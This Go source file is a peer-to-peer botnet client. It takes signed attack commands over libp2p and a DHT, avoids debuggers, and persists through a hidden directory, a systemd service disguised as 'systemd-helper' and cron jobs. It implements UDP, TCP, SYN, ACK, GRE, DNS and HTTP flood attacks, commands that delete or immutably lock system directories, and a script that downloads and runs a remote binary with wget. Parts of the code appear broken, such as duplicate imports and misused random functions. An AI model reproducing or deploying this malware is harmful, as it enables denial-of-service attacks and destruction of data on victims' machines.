package main

import (
	"bytes"
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p-core/crypto"
	"github.com/libp2p/go-libp2p-core/host"
	"github.com/libp2p/go-libp2p-core/network"
	"github.com/libp2p/go-libp2p-core/peer"
	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/miekg/dns"
)

var (
	bootstrapPeers = []string{
		"/ip4/104.131.131.82/tcp/4001/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
		"/ip4/104.131.131.82/udp/4001/quic/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
	}
	publicKey     *rsa.PublicKey
	numWorkers    = 2024
	startTime     = time.Now()
	attackCounter int64
)

type Command struct {
	Command   string `json:"command"`
	Timestamp int64  `json:"timestamp"`
	Signature []byte `json:"signature"`
	TTL       int    `json:"ttl"`
}

type P2PNode struct {
	Host   host.Host
	DHT    *dht.IpfsDHT
	Ctx    context.Context
	Cancel context.CancelFunc
}

type BotNode struct {
	P2PNode
	LastCommandTime time.Time
}

func NewP2PNode() (*P2PNode, error) {
	ctx, cancel := context.WithCancel(context.Background())
	priv, _, err := crypto.GenerateKeyPairWithReader(crypto.RSA, 2048, rand.Reader)
	if err != nil {
		cancel()
		return nil, err
	}

	h, err := libp2p.New(
		libp2p.Identity(priv),
		libp2p.NATPortMap(),
	)
	if err != nil {
		cancel()
		return nil, err
	}

	kadDHT, err := dht.New(ctx, h)
	if err != nil {
		cancel()
		return nil, err
	}

	if err = kadDHT.Bootstrap(ctx); err != nil {
		cancel()
		return nil, err
	}

	return &P2PNode{
		Host:   h,
		DHT:    kadDHT,
		Ctx:    ctx,
		Cancel: cancel,
	}, nil
}

func (n *P2PNode) ConnectToBootstrapPeers() {
	for _, peerAddr := range bootstrapPeers {
		addr, err := peer.AddrInfoFromString(peerAddr)
		if err != nil {
			continue
		}
		if err := n.Host.Connect(n.Ctx, *addr); err != nil {
			continue
		}
	}
}

func (n *P2PNode) StartCommandListener() {
	n.Host.SetStreamHandler("/botnet/command/1.0.0", func(s network.Stream) {
		defer s.Close()
		var cmd Command
		if err := json.NewDecoder(s).Decode(&cmd); err != nil {
			return
		}
		if !cmd.VerifySignature() {
			return
		}
		go handleCommand(cmd.Command)
	})
}

func (c *Command) VerifySignature() bool {
	if time.Now().Unix() > c.Timestamp+int64(c.TTL) {
		return false
	}
	hashed := sha256.Sum256([]byte(c.Command + "|" + string(c.Timestamp)))
	err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], c.Signature)
	return err == nil
}

func (b *BotNode) Start() error {
	b.ConnectToBootstrapPeers()
	b.StartCommandListener()
	go b.ReportStatus()
	go b.FetchCommands()
	return nil
}

func (b *BotNode) ReportStatus() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			status := map[string]interface{}{
				"peer_id":      b.Host.ID().String(),
				"uptime":       time.Since(startTime).Seconds(),
				"last_command": b.LastCommandTime,
				"attack_count": atomic.LoadInt64(&attackCounter),
			}
			data, _ := json.Marshal(status)
			_ = b.DHT.PutValue(b.Ctx, "bot_stats_"+b.Host.ID().String(), data)
		case <-b.Ctx.Done():
			return
		}
	}
}

func (b *BotNode) FetchCommands() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			val, err := b.DHT.GetValue(b.Ctx, "latest_attack_command")
			if err != nil {
				continue
			}
			var cmd Command
			if err := json.Unmarshal(val, &cmd); err != nil {
				continue
			}
			if cmd.VerifySignature() {
				b.LastCommandTime = time.Now()
				go handleCommand(cmd.Command)
			}
		case <-b.Ctx.Done():
			return
		}
	}
}

func CheckDebuggers() {
	debuggers := []string{"gdb", "strace", "ltrace", "tcpdump", "wireshark"}
	for _, tool := range debuggers {
		cmd := exec.Command("pgrep", "-x", tool)
		if err := cmd.Run(); err == nil {
			os.Exit(0)
		}
	}
}

func SetupPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}
	hiddenDir := "/var/lib/.systemd-helper"
	if err := os.MkdirAll(hiddenDir, 0755); err != nil {
		return err
	}
	targetPath := filepath.Join(hiddenDir, ".systemd-process")
	if err := copyFile(exePath, targetPath); err != nil {
		return err
	}
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Helper Service
After=network.target
[Service]
ExecStart=%s
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target`, targetPath)
	servicePath := "/etc/systemd/system/systemd-helper.service"
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "enable", "--now", "systemd-helper.service").Run(); err != nil {
		return err
	}
	cronJob := fmt.Sprintf("@reboot %s", targetPath)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	return cmd.Run()
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, input, 0755)
}

func handleCommand(cmd string) {
	fields := strings.Fields(cmd)
	if len(fields) == 0 {
		return
	}
	switch fields[0] {
	case "!udpflood":
		if len(fields) != 4 {
			return
		}
		go performUDPFlood(fields[1], fields[2], fields[3])
	case "!tcpflood":
		if len(fields) != 4 {
			return
		}
		go TCPfloodAttack(fields[1], fields[2], fields[3])
	case "!synflood":
		if len(fields) != 4 {
			return
		}
		go performSYNFlood(fields[1], fields[2], fields[3])
	case "!ackflood":
		if len(fields) != 4 {
			return
		}
		go performACKFlood(fields[1], fields[2], fields[3])
	case "!greflood":
		if len(fields) != 3 {
			return
		}
		go performGREFlood(fields[1], fields[2])
	case "!dns":
		if len(fields) != 4 {
			return
		}
		go performDNSFlood(fields[1], fields[2], fields[3])
	case "!http":
		if len(fields) != 4 {
			return
		}
		go performHTTPFlood(fields[1], fields[2], fields[3])
	case "!kill":
		killerMaps()
	case "!lock":
		locker()
	case "!persist":
		SystemdPersistence()
	}
	atomic.AddInt64(&attackCounter, 1)
}

func performUDPFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	payload := make([]byte, 65507)
	rand.Read(payload)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					sourcePort := rand.Intn(65535-1024) + 1024
					conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: port})
					if err != nil {
						continue
					}
					_, err = conn.Write(payload)
					if err == nil {
						atomic.AddInt64(&packetCount, 1)
					}
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

func TCPfloodAttack(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(port),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						continue
					}
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func performSYNFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(port),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						continue
					}
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func performACKFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(64312) + 1024),
						DstPort:    layers.TCPPort(port),
						ACK:        true,
						Seq:        rand.Uint32(),
						Ack:        rand.Uint32(),
						Window:     12800,
						DataOffset: 5,
					}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						continue
					}
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func performGREFlood(targetIP, durationStr string) {
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					greLayer := &layers.GRE{}
					payload := make([]byte, 65535-24)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload)); err != nil {
						continue
					}
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func performDNSFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var packetCount int64
	dstIP := net.ParseIP(targetIP)
	domains := []string{"youtube.com", "google.com", "spotify.com", "neflix.com", "bing.com", "facebok.com", "amazom.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := constructDNSQuery(domain, queryType)
					buffer, err := dnsQuery.Pack()
					if err != nil {
						continue
					}
					sourcePort := rand.Intn(65535-1024) + 1024
					_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: port, Zone: fmt.Sprintf("%d", sourcePort)})
					if err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func performHTTPFlood(targetIP, portStr, durationStr string) {
	port, _ := strconv.Atoi(portStr)
	duration, _ := strconv.Atoi(durationStr)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	var requestCount int64
	resolvedIP, err := resolveTarget(targetIP)
	if err != nil {
		return
	}
	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, port)
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
	}
	referers := []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.wikipedia.org/",
	}
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{}
			for {
				select {
				case <-ctx.Done():
					return
				default:
					body := make([]byte, 1024)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					resp, err := client.Do(req)
					if err != nil {
						continue
					}
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

func resolveTarget(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status code %d", resp.StatusCode)
	}
	var dnsResp struct {
		Answer []struct {
			Data string `json:"data"`
		} `json:"Answer"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", err
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no records found")
	}
	return dnsResp.Answer[0].Data, nil
}

func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096)
	msg.Extra = append(msg.Extra, edns0)
	return msg
}

func killerMaps() {
	killDirectories := []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"}
	whitelistedDirectories := []string{"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"}
	for _, dir := range killDirectories {
		whitelisted := false
		for _, whitelistedDir := range whitelistedDirectories {
			if dir == whitelistedDir {
				whitelisted = true
				break
			}
		}
		if !whitelisted {
			os.RemoveAll(dir)
		}
	}
}

func locker() {
	killDirectories := []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"}
	whitelistedDirectories := []string{"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"}
	for _, dir := range killDirectories {
		whitelisted := false
		for _, whitelistedDir := range whitelistedDirectories {
			if dir == whitelistedDir {
				whitelisted = true
				break
			}
		}
		if !whitelisted {
			exec.Command("chattr", "+i", dir).Run()
		}
	}
}

func SystemdPersistence() {
	hiddenDir := "/var/lib/.systemd_helper"
	scriptPath := filepath.Join(hiddenDir, ".systemd_script.sh")
	programPath := filepath.Join(hiddenDir, ".systemd_process")
	url := "http://127.0.0.1/x86"
	os.MkdirAll(hiddenDir, 0755)
	scriptContent := fmt.Sprintf(`#!/bin/bash
	URL="%s"
	PROGRAM_PATH="%s"
	if [ ! -f "$PROGRAM_PATH" ]; then
		wget -O $PROGRAM_PATH $URL
		chmod +x $PROGRAM_PATH
	fi
	if ! pgrep -x ".systemd_process" > /dev/null; then
		$PROGRAM_PATH &
	fi`, url, programPath)
	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	serviceContent := `[Unit]
	Description=System Helper Service
	After=network.target
	[Service]
	ExecStart=/var/lib/.systemd_helper/.systemd_script.sh
	Restart=always
	RestartSec=60
	StandardOutput=null
	StandardError=null
	[Install]
	WantedBy=multi-user.target`
	servicePath := "/etc/systemd/system/systemd-helper.service"
	os.WriteFile(servicePath, []byte(serviceContent), 0644)
	exec.Command("systemctl", "enable", "--now", "systemd-helper.service").Run()
	cronJob := fmt.Sprintf(`* * * * * bash %s/.systemd_script.sh > /dev/null 2>&1`, hiddenDir)
	exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob)).Run()
}

func main() {
	node, err := NewP2PNode()
	if err != nil {
		return
	}
	defer node.Cancel()

	bot := &BotNode{
		P2PNode: *node,
	}
	if err := bot.Start(); err != nil {
		return
	}

	go CheckDebuggers()
	go SetupPersistence()

	select {}
}
